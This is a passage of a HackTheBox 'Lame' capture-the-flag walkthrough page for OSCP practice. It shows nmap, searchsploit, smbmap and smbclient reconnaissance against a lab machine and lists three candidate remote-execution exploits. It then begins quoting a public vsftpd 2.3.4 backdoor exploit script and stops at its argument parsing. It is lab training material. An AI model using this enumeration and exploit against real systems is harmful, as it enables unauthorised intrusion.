@@ -1,0 +1,1387 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Walkthrough of the retired HackTheBox machine, Lame!'>
+<title>HackTheBox Lame Walkthrough (w/o Metasploit)</title>
+
+<link rel='canonical' href='https://novaah.xyz/p/hackthebox-lame-walkthrough-w/o-metasploit/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='HackTheBox Lame Walkthrough (w/o Metasploit)'>
+<meta property='og:description' content='Walkthrough of the retired HackTheBox machine, Lame!'>
+<meta property='og:url' content='https://novaah.xyz/p/hackthebox-lame-walkthrough-w/o-metasploit/'>
+<meta property='og:site_name' content='novaah.xyz'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='HackTheBox' /><meta property='article:tag' content='Samba' /><meta property='article:tag' content='FTP' /><meta property='article:published_time' content='2022-11-13T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-11-13T00:00:00&#43;00:00'/><meta property='og:image' content='https://novaah.xyz/p/hackthebox-lame-walkthrough-w/o-metasploit/Lame.png' />
+<meta name="twitter:title" content="HackTheBox Lame Walkthrough (w/o Metasploit)">
+<meta name="twitter:description" content="Walkthrough of the retired HackTheBox machine, Lame!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://novaah.xyz/p/hackthebox-lame-walkthrough-w/o-metasploit/Lame.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/pfp_hu11076ffe2a4d17cdab0fd62230a41504_20919_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">novaah.xyz</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='mailto:aaron@novaah.xyz'
+                        target="_blank"
+                        title="Email"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-at" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <circle cx="12" cy="12" r="4" />
+  <path d="M16 12v1.5a2.5 2.5 0 0 0 5 0v-1.5a9 9 0 1 0 -5.5 8.28" />
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://infosec.exchange/@novaah'
+                        target="_blank"
+                        title="Mastodon"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-affiliate" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M5.931 6.936l1.275 4.249m5.607 5.609l4.251 1.275" />
+  <path d="M11.683 12.317l5.759 -5.759" />
+  <circle cx="5.5" cy="5.5" r="1.5" />
+  <circle cx="18.5" cy="5.5" r="1.5" />
+  <circle cx="18.5" cy="18.5" r="1.5" />
+  <circle cx="8.5" cy="15.5" r="4.5" />
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://aaronwasserman.com'
+                        target="_blank"
+                        title="Personal Site"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/AaronJWasserman'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#scanning--enumeration">Scanning &amp; Enumeration</a>
+      <ol>
+        <li><a href="#ssh">SSH</a></li>
+        <li><a href="#ftp">FTP</a></li>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#distcc">DistCC</a></li>
+      </ol>
+    </li>
+    <li><a href="#gaining-access">Gaining Access</a>
+      <ol>
+        <li><a href="#vsftpd-234---backdoor-command-execution">vsftpd 2.3.4 - Backdoor Command Execution</a></li>
+        <li><a href="#samba-3020---username-map-script-command-execution">samba 3.0.20 - &lsquo;Username&rsquo; map script&rsquo; Command Execution</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#grabbing-flags">Grabbing Flags</a>
+      <ol>
+        <li><a href="#user-flag">User Flag</a></li>
+        <li><a href="#root-flag">Root Flag</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hackthebox-lame-walkthrough-w/o-metasploit/">
+                <img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/Lame_hu4205851be0a2e9cddbb11c4baa04b892_365849_800x0_resize_box_3.png"
+                        srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/Lame_hu4205851be0a2e9cddbb11c4baa04b892_365849_800x0_resize_box_3.png 800w, /p/hackthebox-lame-walkthrough-w/o-metasploit/Lame_hu4205851be0a2e9cddbb11c4baa04b892_365849_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox Lame Walkthrough (w/o Metasploit)" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hackthebox/" >
+                HackTheBox
+            </a>
+        
+            <a href="/categories/walkthroughs/" >
+                Walkthroughs
+            </a>
+        
+            <a href="/categories/oscp-prep/" >
+                OSCP Prep
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hackthebox-lame-walkthrough-w/o-metasploit/">HackTheBox Lame Walkthrough (w/o Metasploit)</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Walkthrough of the retired HackTheBox machine, Lame!
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 13, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    8 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="introduction">Introduction</h2>
+<p>Hi! Welcome to my first post on the blog and first HackTheBox walkthrough. I&rsquo;m currently preparing to take the OSCP certification exam and decided to tackle TJ_Null&rsquo;s OSCP-like VMs list! Lame is the first Linux box on the list.
+<img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/tj.png"
+	width="1726"
+	height="1490"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/tj_hu91bd3373c0eb379e7e0fb2b45f5b5bd2_261756_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/tj_hu91bd3373c0eb379e7e0fb2b45f5b5bd2_261756_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="TJ_Null&rsquo;s HackTheBox OSCP-like VMs list"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="115"
+		data-flex-basis="278px"
+	
+>
+Since I am doing this in preparation for the OSCP exam where Metasploit usage is restricted, I didn&rsquo;t use Metasploit while completing this box.</p>
+<h2 id="scanning--enumeration">Scanning &amp; Enumeration</h2>
+<p>Upon launching the machine on HackTheBox, we are given the machine IP <code>10.10.10.3</code></p>
+<p>I started off by running a quick nmap scan to give myself some leads to start following while waiting for a more intensive scan to run.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -Pn 10.10.10.3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame_initial_nmap.png"
+	width="516"
+	height="220"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame_initial_nmap_hu47499840f7b1d8ead33ea1ddb0738ee9_36379_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame_initial_nmap_hu47499840f7b1d8ead33ea1ddb0738ee9_36379_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Initial nmap scan"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="562px"
+	
+><br>
+From this initial scan, we can see FTP, SSH, and SMB services running.</p>
+<p>Next, I ran a more intensive nmap scan in the background while I started my enumeration steps.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -Pn -A -v -p- 10.10.10.3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame_nmap.png"
+	width="620"
+	height="629"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame_nmap_hufa8b0ca91b52fc4aea24d79d052b0dfd_120261_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame_nmap_hufa8b0ca91b52fc4aea24d79d052b0dfd_120261_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Intensive nmap scan"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="98"
+		data-flex-basis="236px"
+	
+><br>
+This scan actually ran pretty quickly before I had time to jump into early enumeration. We can see an additional service that we didn&rsquo;t catch in our early scan, DistCC.</p>
+<h3 id="ssh">SSH</h3>
+<p>SSH is unlikely to be our entry point but before we table it, I checked searchsploit for the version we found in our nmap scan (OpenSSH 4.7p1) just in case.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit OpenSSH 4.7p1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Sifting through the results, nothing looks interesting so we can move past SSH for now.</p>
+<h3 id="ftp">FTP</h3>
+<p>Next, we will take a look at FTP.  We saw in our intensive nmap scan that anonymous login was allowed. Let&rsquo;s try that.
+<img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-anon-ftp.png"
+	width="386"
+	height="247"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-anon-ftp_hu952fa0193b160e936ff3e8f0f225f30e_30314_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame-anon-ftp_hu952fa0193b160e936ff3e8f0f225f30e_30314_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Anonymous FTP login"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="156"
+		data-flex-basis="375px"
+	
+><br>
+This didn&rsquo;t yield anything. Let&rsquo;s check searchsploit for the version information we found with nmap.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit vsftpd 2.3.4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame_vsftpd_ss.png"
+	width="654"
+	height="161"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame_vsftpd_ss_hu6ae0b4a9ad6341bda00e369009833677_30728_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame_vsftpd_ss_hu6ae0b4a9ad6341bda00e369009833677_30728_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="vsftpd 2.3.4 searchsploit results"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="406"
+		data-flex-basis="974px"
+	
+><br>
+This looks promising! An RCE with an accompanying Metasploit module. We will add this to our list of things to try. Before we dive right into attempting to exploit this avenue, let&rsquo;s finish checking out the other services from our scan.</p>
+<h3 id="smb">SMB</h3>
+<p>First, we will enumerate using smbmap.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbmap -H 10.10.10.3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-smbmap.png"
+	width="1025"
+	height="168"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-smbmap_hu2e6e7cadfc13305095148bd0d56f25a3_27230_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame-smbmap_hu2e6e7cadfc13305095148bd0d56f25a3_27230_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="smbmap -H results"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="610"
+		data-flex-basis="1464px"
+	
+><br>
+We have access to the /tmp share. Lets try to see what is in it!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbclient -N //10.10.10.3/tmp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-tmp-smb.png"
+	width="609"
+	height="232"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-tmp-smb_hu30910d74ff3107d3af1d67af390fd512_41295_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame-tmp-smb_hu30910d74ff3107d3af1d67af390fd512_41295_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Connecting to /tmp share"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="262"
+		data-flex-basis="630px"
+	
+><br>
+None of this looks too interesting.</p>
+<p>We also saw in the nmap scan that we are working with SMB 3.0.20. Let&rsquo;s check searchsploit.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit samba 3.0.20
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-smb-ss.png"
+	width="996"
+	height="213"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-smb-ss_hu68626969fd9a07d6bcb8d283734230c3_52364_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame-smb-ss_hu68626969fd9a07d6bcb8d283734230c3_52364_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="Samba 3.0.20 searchsploit results"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="467"
+		data-flex-basis="1122px"
+	
+><br>
+The seccond listing looks interesting. The version number fits and the entry lists command execution. We will add this to our list of things to try.</p>
+<h3 id="distcc">DistCC</h3>
+<p>Finally I checked searchsploit for any distcc exploits.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit distccd 4.2.4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-distcc-ss-v.png"
+	width="250"
+	height="91"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-distcc-ss-v_huffa0bbb1016648223c6fbbd0a43602af_17373_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame-distcc-ss-v_huffa0bbb1016648223c6fbbd0a43602af_17373_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="DistCC searchsploit results"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="274"
+		data-flex-basis="659px"
+	
+><br>
+Checking with the version number we found did not return any results, however, checking with just distcc did find an exploit.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit distcc
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-distcc-ss.png"
+	width="999"
+	height="149"
+	srcset="/p/hackthebox-lame-walkthrough-w/o-metasploit/lame-distcc-ss_huf13f7c59ea9536845f2fc7e7c32e1c18_19104_480x0_resize_box_3.png 480w, /p/hackthebox-lame-walkthrough-w/o-metasploit/lame-distcc-ss_huf13f7c59ea9536845f2fc7e7c32e1c18_19104_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="DistCC searchsploit general results"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="670"
+		data-flex-basis="1609px"
+	
+><br>
+Not only did it find an exploit, it found an RCE! Since the version number isn&rsquo;t explicitly present, we don&rsquo;t have a lot of confidence yet that our system is vulnerable but we will definitely add this to our list of things to try.</p>
+<h2 id="gaining-access">Gaining Access</h2>
+<p>After our scanning and enumeration, we have a list of three potential avenues for gaining an initial foothold:</p>
+<ol>
+<li>vsftpd 2.3.4 - Backdoor Command Execution</li>
+<li>samba 3.0.20 - &lsquo;Username&rsquo; map script&rsquo; Command Execution</li>
+<li>DistCC Daemon - Command Execution</li>
+</ol>
+<h3 id="vsftpd-234---backdoor-command-execution">vsftpd 2.3.4 - Backdoor Command Execution</h3>
+<p>Let&rsquo;s start with the FTP exploit. Since I am doing this lab in preparation for the OSCP exam which restricts the use of Metasploit, I will check out the python exploit listed in searchsploit instead of the Metasploit module.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Date: 9-04-2021</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Exploit Author: HerculesRD</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Version: vsftpd 2.3.4</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Tested on: debian</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># CVE : CVE-2011-2523</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">telnetlib</span> <span class="kn">import</span> <span class="n">Telnet</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">signal</span> <span class="kn">import</span> <span class="n">signal</span><span class="p">,</span> <span class="n">SIGINT</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">signal_received</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Handle any cleanup here</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;   [+]Exiting...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">handler</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">=</span><span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;host&#34;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;input the address of the vulnerable host&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
